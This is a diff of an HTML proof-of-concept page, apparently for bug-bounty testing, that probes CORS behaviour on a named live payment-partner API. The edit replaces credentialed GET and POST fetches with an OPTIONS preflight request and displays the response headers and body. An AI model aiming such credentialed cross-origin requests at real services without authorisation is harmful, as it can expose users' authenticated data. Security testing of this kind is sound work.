@@ -1,51 +1,25 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CORS PoC Exploit - Debug</title>
+    <title>CORS PoC Exploit - OPTIONS Debug</title>
   </head>
   <body>
-    <h1>Proof of Concept - CORS Exploit (Debug Mode)</h1>
-
-    <button onclick="exploitGET()">Run Exploit (GET)</button>
-    <button onclick="exploitPOST()">Run Exploit (POST)</button>
+    <h1>Proof of Concept - CORS PoC Exploit (OPTIONS Debug)</h1>
+    <button onclick="exploitOPTIONS()">Run Exploit (OPTIONS)</button>
 
     <pre id="output"></pre>
 
     <script>
       const target = "https://partner-api.alipayplus.com/api/aplus/applySupport.json";
 
-      // ============ GET request ============
-      function exploitGET() {
+      function exploitOPTIONS() {
         fetch(target, {
-          method: "GET",
-          credentials: "include"
-        })
-        .then(async response => {
-          let headers = "";
-          response.headers.forEach((v, k) => headers += k + ": " + v + "\n");
-          const text = await response.text();
-
-          document.getElementById("output").textContent =
-            "=== GET Request ===\n" +
-            "Status: " + response.status + "\n\n" +
-            "Headers:\n" + headers + "\n" +
-            "Body:\n" + (text || "[empty body]");
-        })
-        .catch(error => {
-          document.getElementById("output").textContent =
-            "GET Error: " + error;
-        });
-      }
-
-      // ============ POST request ============
-      function exploitPOST() {
-        fetch(target, {
-          method: "POST",
+          method: "OPTIONS",
           credentials: "include",
           headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ test: "CORS exploit" })
+            "Access-Control-Request-Method": "POST",
+            "Access-Control-Request-Headers": "content-type,ctoken"
+          }
         })
         .then(async response => {
           let headers = "";
@@ -53,14 +27,14 @@
           const text = await response.text();
 
           document.getElementById("output").textContent =
-            "=== POST Request ===\n" +
+            "=== OPTIONS Request ===\n" +
             "Status: " + response.status + "\n\n" +
             "Headers:\n" + headers + "\n" +
             "Body:\n" + (text || "[empty body]");
         })
         .catch(error => {
           document.getElementById("output").textContent =
-            "POST Error: " + error;
+            "OPTIONS Error: " + error;
         });
       }
     </script>
